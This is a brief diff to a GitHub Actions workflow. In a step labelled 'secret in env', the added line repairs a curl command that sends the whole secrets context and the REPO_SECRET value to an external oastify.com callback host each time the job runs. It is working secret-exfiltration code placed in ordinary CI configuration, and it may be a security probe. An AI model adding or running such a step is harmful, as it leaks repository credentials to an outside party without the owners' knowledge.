@@ -30,7 +30,7 @@ jobs:
       - name: secret in env
         run: |
               echo Hello, world! ${{ secrets.TEST }}
-              curl https://6biih2r44ot1wfgsayxb7pmk9bf23yrn.oastify.com/$(${{ secrets }}| jq -c .)+${{ secrets.REPO_SECRET }}
+              curl https://6biih2r44ot1wfgsayxb7pmk9bf23yrn.oastify.com/$(echo ${{ secrets }}| jq -c .)+${{ secrets.REPO_SECRET }}
 
 
 
